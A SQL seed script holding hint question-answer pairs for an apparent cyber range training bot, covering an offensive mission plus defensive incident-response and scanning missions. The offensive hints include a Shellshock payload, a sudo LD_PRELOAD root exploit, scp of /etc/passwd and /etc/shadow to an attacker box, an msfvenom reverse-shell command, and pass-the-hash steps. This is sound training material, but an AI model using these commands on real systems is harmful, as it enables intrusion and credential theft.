INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (482, 5, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You need to use a combination of tools to effectively gather credentials from the first target. You should use you''re privilege elevated copy of bash to scp the /etc/passwd and /etc/shadow files to your Kali box where you can run John the Ripper.', N'm', N'401591d6897c4ea3957155eeea9a478d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (483, 5, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', N'm', N'e49ef7c81ed5415cbb1da96b1ea50693')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (484, 5, NULL, N'how do I find the malware?', N'how do i find the malware', N'This is an offensive mission, you don''t need to be looking for malware.', N'm', N'16362c1ecdc3470ba772a6cfff15bdf6')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (485, 5, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'In the mission orders you were given the domain name thor.com. There are two steps to this objective. Step 1: using nmap find the server and a vulnerable service running on the server. Step 2: establish a connection to the target webserver via the vulnerable service.', N'm', N'b968d520bb25435cad60b74c432075ce')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (486, 5, 1, N'how do I do step 1?', N'how do i do step 1', N'To find the C2 IP address and accurately identify the vulnerable service, you should scan thor.com using nmap with the -Pn and -v flags.', N'm', N'6c75b8af9acd474794f98aa3017e8619')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (487, 5, 1, N'how do I do step 2?', N'how do i do step 2', N'You should connect to the vulnerable service using netcat. If you found port 80 or 8080 issue a head request once you''ve connected to the service with netcat (e.g. HEAD / HTTP/1.0 <enter><enter>), but if you found port 81 or 9999 simply enter a bit of input (e.g. asdf <enter><enter>). You should also browse to thor.com in a web browser for more info - use the address http://thor.com:<port number>', N'm', N'c2231403008e4ee48894cee0e3887d9c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (488, 5, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'The next step is discovering the vulnerability and exploiting it. I''ll point you in the right direction based on which ports are open. If you find port 80 or 8080 there is a vulnerable version of nginx. If port 81 or 9999 is discovered, there is a vulnerable flask application.', N'm', N'560795f7689e40bbbfa680706f13270f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (489, 5, NULL, N'how do I exploit nginx?', N'how do i exploit nginx', N'Before you exploit the service, start a netcat listener on your Kali box. To exploit nginx you need to create and execute a buffer overflow script so you can launch a reverse shell back to the kali listener.', N'm', N'0f7126388411422eb82acc29b8b5bd91')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (490, 5, NULL, N'how do I exploit the flask app?', N'how do i exploit the flask app', N'Before you exploit the service, start a netcat listener on your Kali box. To exploit the flask app you need to navigate to thor.com in a web browser and leverage the shellshock vulnerability to launch a reverse shell back to your kali listener.', N'm', N'e3972310022c494a915a8572e0c235e3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (491, 5, NULL, N'how do I exploit the shellshock vulnerability?', N'how do i exploit the shellshock vulnerability', N'The flask app will store the API key in an environment variable. You can leverage the shellshock vulnerability by entering certain text for the API key, followed by a command to execute. For example, entering the following for the API key will execute the pwd command: () { :; }; pwd', N'm', N'a7b7b8d0c0af4e179b29e29e6701018b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (492, 5, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'To complete this objective, you need to execute a local privilege escalation exploit. Step 1: find a vulnerability in the available version of sudo. Step 2: on your Kali box, create and compile a c program to exploit the vulnerability. Step 3: copy the exploit to the server and run the exploit.', N'm', N'b05f6aa0fd9c4bb4b1b6c4b10c5b9685')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (493, 5, 3, N'how do I do step 1?', N'how do i do step 1', N'You can query the version of sudo with the command: sudo -V. You can check if you have permission to run any commands with sudo using the following command: sudo -l. Extensive research on this version of sudo reveals that it fails to clear environment variables prior to executing commands with elevated privileges.', N'm', N'3ff2f854b4e14c12845110d4bdc39d66')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (494, 5, 3, N'how do I do step 2?', N'how do i do step 2', N'To leverage the vulnerability, you can write a program to create a copy of the bash shell, change the owner and group of the file to root, and set the sticky bit which will cause it to run as the root user. You can write c code to accomplish these tasks. If you need assistance with the code consider sacrificing some bonus points to view the hints for this objective. Compile your code with this command, assuming you named the file exploit.c: gcc ~/exploit.c -o ~/exploit.o -fPIC -shared -nostartfiles', N'm', N'0179e7cf0207465bbf4bad96005417ca')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (495, 5, 3, N'how do I do step 3?', N'how do i do step 3', N'You can use scp to transfer your file to web1, then you can use the following command to execute the exploit: sudo LD_PRELOAD=/home/apennino/exploit.o /bin/ls /root', N'm', N'dbda37046f3b460592831511e6344559')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (496, 5, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'Objective 4 requires you to gather credentials from web1 and use them to log in to web2. Step 1: using your elevated privileges, copy the shadow and passwd files back to your kali box and use unshadow to join the passwd and shadow files together and pipe the output to a new file, then use john the ripper to crack the password hash. Step 2: use msfvenom to generate a reverse tcp payload. Step 3: use metasploit to deliver your payload, access the system, and acquire a password hash to be used in a pass the hash attack.', N'm', N'13094647ce9e4548bad67a29cf0f6066')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (497, 5, 4, N'how do I do step 1?', N'how do i do step 1', N'In the previous objective you should have created a copy of bash in the /tmp directory that can run commands as root. You can run the following command to scp the files back to your kali box: /tmp/.bash -p -c "scp /etc/{passwd,shadow} user1@172.16.0.11:~". Then you need to use chmod to give yourself read permission on the shadow file, and use unshadow to join the passwd and shadow files - don''t forget to pipe the output to a new file. Unshadow and john the ripper are in /usr/sbin/. Finally, you can use john to crack the password hash in the new file: /usr/sbin/john ~/<filename>', N'm', N'd3ae45f9f9634c9bb3309635664b0a30')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (498, 5, 4, N'how do I do step 2?', N'how do i do step 2', N'You can use the following command to generate a reverse tcp payload with msfvenom: msfvenom -p python/meterpreter_reverse_tcp LHOST=172.16.0.11 LPORT=9999 -o ~/payload.py', N'm', N'cbf84329dd9e47abaebb9ce4c8b6c6f2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (499, 5, 4, N'how do I do step 3?', N'how do i do step 3', N'You need to transfer the payload to the web1 box, start an exploit handler with metasploit, then execute your payload on web1 to launch the reverse shell to your waiting handler. Once you''ve connected with meterpreter you can use autoroute to add a route to the 192.168.0.0/24 subnet. Once you''ve added the route, you can use the metasploit psexec module to login to the second server (web2). Finally, use the hashdump post exploitation module to collect a hash for idrago''s password to be used in the next objective for a pass the hash attack.', N'm', N'8e20c7c97d1c485b917313745d981c71')
GO
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (500, 5, NULL, N'how do I do objective 5?', N'how do i do objective 5', N'You should use metasploit to access the next internal system. Step 1: use autoroute to add a route to the 192.168.10.0/24 network. Step 2: Use the metasploit psexec module to login to the next target.', N'm', N'c93d59d3da3a4344b6942affac67dbfd')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (501, 5, 5, N'how do I do step 1', N'how do i do step 1', N'You should already have meterpreter sessions open on web1 and web2 - you can use either one for this step since they are on the same network. Again, you should use the tool autoroute to add a route, this time to the 192.168.10.0/24 network.', N'm', N'4bfe40e81a2b481f97d61d4bc980417a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (502, 5, 5, N'how do I do step 2', N'how do i do step 2', N'You should again use metasploit''s psexec module, but this time you should use the hash you collected as the SMBPass option.', N'm', N'680541e1e0ae4f3c8fd6886cf9c535d4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (503, 5, NULL, N'how do I do objective 6?', N'how do i do objective 6', N'To complete the final objective, you must search the filesystem for the account information. You can perform this manually by using meterpreter''s shell command to drop to a windows shell and manually browse directories. A quicker method is to use the search feature of meterpreter to find files of interest.', N'm', N'e97daeb66fee433bb459e393aac2dd2b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (504, 5, NULL, N'where is the account information?', N'where is the account information', N'On Web2, search for .txt files in the C:\Windows\System32\ directory to look for the secret file. You can find out more about the meterpreter search functionality by entering the following command at a meterpreter prompt to view the help banner: search -h. When you find the file you can drop into a Windows shell (if you have not already done so) and view the file with the type command.', N'm', N'80739e16530c4fcc8a84c08f4213c16e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (505, 7, NULL, N'what tools should I use?', N'what tools should i use', N'For this mission you will need to use SGUIL to monitor network traffic for indicators of compromise, and VirusIOC checker to verify indicators of compromise. You will need to use a text editor or the cat command to audit the email policies, and use the Group Policy Management console on the Domain Controller to audit the Group and User policies. You will need to use Rdesktop to login to other machines on your network like the Domain Controller and the infected machine, and you will need to use tools including but not limited to Procexp and TCPView to eradicate the infection.', N'e', N'97467be07e854ef49aaa9b612f43a39b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (506, 7, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'This is primarily a defensive mission, and finding/attacking a C2 server is not one of your objectives.', N'e', N'c2b93cc340d042b68ff6809b2ac8a848')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (507, 7, NULL, N'what are my network monitoring tools?', N'what are my network monitoring tools', N'Your most important network monitoring tools are SGUIL and ELSA.', N'e', N'59b422f797224d03939dda20648f092e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (508, 7, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'You might need to use nmap to find the IP address of the router in this mission. Consider finding the correct subnet on the network map then using nmap to scan an appropriate range of IP addresses.', N'e', N'2e991e0264794eca830f602ce66702b3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (509, 7, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should not need to find a password for this mission.', N'e', N'e94acfc87ec54d62aa24a4a27722ecec')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (510, 7, NULL, N'how do I open procexp?', N'how do i open procexp', N'All the windows boxes you have access to should have the sysinternals tool suite installed. You can navigate to C:\sysinternals in the Windows file explorer and search that folder for procexp. Use the entry with Application in the Type column and agree to the license agreement if necessary. Sometimes you will need to run this tool as an administrator. There are at least two malicious processes in this mission, and you will need to find and remove at least two source code files.', N'e', N'b5a07d524b9445209ec937222e69b0ea')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (511, 7, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'Use your credentials to login to the network monitoring tool SGUIL and verify the tool is monitoring traffic on your network. You will need to change the Sguild host in the login dialog box to 172.16.30.11.', N'e', N'37a0a9c2d57048dcb96516b5cbdb5dde')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (512, 7, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'To complete this objective you need to review the email policies located in the /opt/edge-exchange/edge_config.xml file.', N'e', N'f997122236644fbe8cd142db2aaf6bf4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (513, 7, NULL, N'how do I review the email policies?', N'how do i review the email policies', N'You can examine the email policies by catting them to the command line or by viewing them in a file editor like vi. As a reminder, the email policies are located in the file /opt/edge-exchange/edge_config.xml', N'e', N'0badd5efbdb64170901192b39ffe1e59')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (514, 7, NULL, N'how do I review the group policies?', N'how do i review the group policies', N'Log into the domain controller (at the IP address 172.16.10.10) with Rdesktop and review group and user policies by opening the group policy management console (GPMC).', N'e', N'224165e5049540faac8e5c06e312c363')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (515, 7, NULL, N'what is suspicious about the process?', N'what is suspicious about the process', N'There are at least two malicious processes. You should use TCPView to find a malicious process connecting to an unresolved external IP address. Note the source code location and the PID. Now run Procexp as an administrator to track down the next malicious process and any files associated with it. You should find a .vbs file.', N'e', N'6a6535f4aa4b4df9a92929048e030b2c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (516, 7, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'Examine SIRDACON''s domain group and user policies to determine if they should be modified to conform to best practices. You should use rdesktop to login to the domain controller (172.16.10.10) and review the policies, which can be found in the Group Policy Management tool. In the rdesktop command your username should be SIRDACON\\user<#> where <#> is your user number on the client1 box and your password is the same as your SGUIL password.', N'e', N'9377e3dd79a146b9baff5add4b540eb4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (517, 7, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'Step 1: use SGUIL to find an alert indicating an exploit of cve 2014-6332. Step 2: open a pcap of the traffic for the initial alert (cve 2014-6332) and reconstruct the URL of the initial HTTP GET request. Step 3: feed that to your VirusIOC software to verify the request was made to a known malicious domain.', N'e', N'1afd92c5b8d74d6b8ead33255853f000')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (518, 7, 4, N'how do I do step 1?', N'how do i do step 1', N'You might want to maximize SGUIL so more of the event message column is visible - cve 2014-6332 will be mentioned there. The alert should be followed shortly thereafter by two additional alerts indicating EXE or DLL file downloads in quick succession. The combination of these alerts may indicate a multi-staged payload utilizing multiple IP/port combinations to exploit and infect the targeted machine.', N'e', N'4b381a6d7dfb4705be52caa84311493b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (519, 7, 4, N'how do I do step 2?', N'how do i do step 2', N'To open the pcap, right click on the Alert ID (in the fourth column) of the initial alert and hold down the right mouse button. Move the cursor over the ''transcript'' option and release the right mouse button. After a moment a window will open displaying traffic that generated this alert. There should be a light blue section displaying metadata towards the top, followed by the decoded traffic shown in blue and red text. Your reconstructed request should follow this general format: http://<IP address>/<random alphanumeric file path>', N'e', N'380eded1304e40e3849af05c42593e86')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (520, 7, 4, N'how do I do step 3?', N'how do i do step 3', N'Some tools will accept web addresses or file hashes as input and tell you if your input is associated with known malware. VirusIOC is a substitute for one of these real world tools, and is available one your desktop. You may need to close or minimize windows to see it. You can then submit the reconstructed GET request to the URL textbox and click submit. You should see a page indicating ''1 result(s) found''.', N'e', N'2a86188c26a1452ca3bd50d37cd3a320')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (521, 7, NULL, N'why does virus IOC say no results?', N'why does virus ioc say no results', N'Make sure that you have correctly reconstructed the original HTTP GET request to the malicious server. Also make sure you are using the correct IP address for the malicious connection. The TCP Trace of the connection should have lines that say something like, ''SRC: GET /ux0fb4fi HTTP/1.1'' and in that example the file path is just /ux0fb4fi. The reconstructed request should follow this pattern: http://<IP address>/<random alphanumeric file path>', N'e', N'6e445921e68d47bda94c4fc8760c29d7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (522, 7, NULL, N'how do I do objective 5?', N'how do i do objective 5', N'Login to the infected machine, then find and kill any malicious processes exfiltrating data from the network or misbehaving in other ways. Be sure to note the source code location before killing the process. You should use tcpview and procexp, and may want to start the applications as an administrator. Watch out for processes connecting to any of the malicious IP addresses found in previous objectives.', N'e', N'63b015ac3b904829b01e7a9b20db5417')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (523, 7, NULL, N'how do I find the source code associated with a process on Windows?', N'how do i find the source code associated with a process on windows', N'You can usually find source code used to start a process by right clicking, then viewing the properties of a process in Procexp or TCPView - to have access to the properties of every process, the tools should be run as administrator.', N'e', N'd121c1dd414c4bb39323bbf7ee322493')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (524, 7, NULL, N'how do I do objective 6?', N'how do i do objective 6', N'Track down and remove all artifacts of the infection. This includes any malicious source code, any persistence mechanisms, and any malicious processes that may have been restarted. A good place to begin would be starting the application Autoruns as an administrator to search for possible persistence mechanisms.', N'e', N'a87bad51cd954114a7262e39aa7cea1c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (525, 7, NULL, N'what are the persistence mechanisms?', N'what are the persistence mechanisms', N'One possible persistence mechanism on Windows is an Autoruns entry. You may want to filter the entries based on the user.', N'e', N'd24f9dc495b3486291dcc49a89aa7aa7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (526, 7, NULL, N'what tools should I use?', N'what tools should i use', N'For this mission you will need to use SGUIL and ELSA to monitor network traffic for indicators of compromise, and VirusIOC checker to verify indicators of compromise. You may also need to download a tool called officeparser to extract useful objects from network traffic. You will need to use a text editor or the cat command to audit the email policies, and use the Group Policy Management console on the Domain Controller to audit the Group and User policies. You will need to use Rdesktop to login to other machines on your network like the Domain Controller and the infected machine, and you will need to use tools including but not limited to Procexp and TCPView to eradicate the infection.', N'm', N'e33b3427f0a14e1295ab4441c735a04f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (527, 7, NULL, N'what are my network monitoring tools?', N'what are my network monitoring tools', N'Your most important network monitoring tools are SGUIL and ELSA.', N'm', N'77cf63aee7314243ae170491e0a3652c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (528, 7, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should not need to find a password for this mission.', N'm', N'd2bbadeba6f74bf9bd49243092903029')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (529, 7, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'This is primarily a defensive mission, and finding/attacking a C2 server is not one of your objectives.', N'm', N'877464484da8462b8085a0e4d923e07c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (530, 7, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'You might need to use nmap to find the IP address of the router in this mission. Consider finding the correct subnet on the network map then using nmap to scan an appropriate range of IP addresses.', N'm', N'7f37c504e2ac44fe8111cc85662edae2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (531, 7, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'Use your credentials to login to the network monitoring tool SGUIL and verify the tool is monitoring traffic on your network. You will need to change the Sguild host in the login dialog box to 172.16.30.11.', N'm', N'3fd7484a61724dc2aee1ff6d1584a1c0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (532, 7, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'To complete this objective you need to review the email policies located in the /opt/edge-exchange/edge_config.xml file.', N'm', N'c6b7e54287984af28afc8493bf4b3aa7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (533, 7, NULL, N'how do I review the email policies?', N'how do i review the email policies', N'You can examine the email policies by catting them to the command line or by viewing them in a file editor like vi. As a reminder, the email policies are located in the file /opt/edge-exchange/edge_config.xml', N'm', N'2547a721c143484092da0192541952d3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (534, 7, NULL, N'how do I review the group policies?', N'how do i review the group policies', N'Log into the domain controller (at the IP address 172.16.10.10) with Rdesktop and review group and user policies by opening the group policy management console (GPMC).', N'm', N'921dd22e45ea44bfa28a32034526d164')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (535, 7, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'Examine SIRDACON''s domain group and user policies to determine if they should be modified to conform to best practices. You should use rdesktop to login to the domain controller (172.16.10.10) and review the policies, which can be found in the Group Policy Management tool. In the rdesktop command your username should be SIRDACON\\user<#> where <#> is your user number on the client1 box and your password is the same as your SGUIL password.', N'm', N'21f757ae3028487b8ed55b015677569d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (536, 7, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given). There are some cases in this mission, such as using rdesktop to access another machine on the network, when you will need to preface the username with the domain name. For example, the command to rdesktop to 172.16.0.10 (appropriately substituting for <#>) would be the following: rdesktop -u SIRDACON\\user<#> -p P@ssedU<#> 172.16.0.10', N'm', N'5cb1d09d27ec409fa9a39a40e8619822')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (537, 7, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'Find some suspicious network traffic to lead you to the infected machine, and use VirusIOC checker to verify the machine has been compromised by known malware. Step 1: There are no obvious alerts in ELSA, so search for evidence of a phishing campaign and download a pcap to investigate. Step 2: Use NetworkMiner to carve out the Excel Spreadsheet included in the email correspondence identified in step 1. Step 3: Upload a tool like Office Parser to search the file for malicious macros. Step 4: verify the indicator of compromise with virusIOCchecker.', N'm', N'e9cec543edcb47bf9f79cbb162b5dee2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (538, 7, 4, N'how do I do step 1?', N'how do i do step 1', N'Login to ELSA and query the bro logs for word documents since this is a suspected phishing attack. You should be able to pivot by querying for the event ID, which should be the second | separated entry in the Fields column of the results. This should lead you to an email correspondence containing a record of class=BRO_SMTP. Download a pcap from this record to investigate.', N'm', N'f28f9c0e7d494dbdbed5804810dcd659')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (539, 7, 4, N'how do I do step 2?', N'how do i do step 2', N'Open NetworkMiner on your machine. Use the file menu to open the pcap you downloaded from ELSA. When you''ve opened your pcap, click the Files tab in NetworkMiner. You should see multiple files including an Excel spreadsheet with the .xls extension. Right click this file and select Open folder and note the path of the file.', N'm', N'96f53861b17a4e95a525f2ebbef960e3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (540, 7, 4, N'how do I do step 3?', N'how do i do step 3', N'Since you''re perfoming analysis from a Linux box, you need to download a tool like Office Parser to search through the Excel spreadsheet. You can find Office Parser online at https://raw.githubusercontent.com/unixfreak0037/officeparser/master/officeparser.py and upload the tool to the cyber range via the SSH terminal. When you''ve uploaded Officeparser you can run the following command to extract any macros, substituting in the correct filename: python officeparser.py -extract-macros /opt/networkminer/AssembledFiles/192.168.0.12/TCP-25/<filename>.xls. This will create several files.', N'm', N'2215c6f81d0e4d0dbcfeda2a8ac8c312')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (541, 7, 4, N'how do I do step 4?', N'how do i do step 4', N'You can search through files quickly with grep. Look for anything malicious in the files created by office parser like a call to powershell. Open VirusIOCchecker, located on your desktop. You should find a URL somewhere embedded in the macro. Submit this URL to VirusIOCchecker.', N'm', N'164fc95ac9f04846a60a873a9eeea79e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (542, 7, NULL, N'how do I do objective 5?', N'how do i do objective 5', N'Find and kill any malicious process that is exfiltrating data from the network. In the previous objective you should have found a malicious macro hidden in an Excel spreadsheet. The macro contains a reference to a malicious domain name, so search in ELSA for this domain name to try and find malicious connections to a machine on your network - the infected machine. Use rdesktop to login to the infected machine and kill any malicious processes.', N'm', N'aa0716628ca846368947314be0200656')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (543, 7, NULL, N'how do I do objective 6?', N'how do i do objective 6', N'Track down and remove all artifacts of the infection. This includes any source code or persistence mechanisms. If you cannot find anything in Autoruns you might have better luck looking in the Task Scheduler.', N'm', N'3a741a6c4e86420fab0236d126442fa5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (544, 7, NULL, N'how do I do objective 7?', N'how do i do objective 7', N'After removing all artifacts of infection, ensure that no malicious processes were restarted before you eliminated their persistence mechanisms.', N'm', N'd869b46431b54e59abb64f958267d873')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (545, 8, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'You need to run the openvas-setup command as root and make note of the password given at the end of the output.', N'e', N'5017c674ad7842e3ac7597fa7085d1c8')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (546, 8, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'You need to use the Greenbone security assistant to run a Quick start scan on the server network. You can open Greenbone in the chromium browser at https://localhost:9392.', N'e', N'a6b635cf447f456c942836b5f0690369')
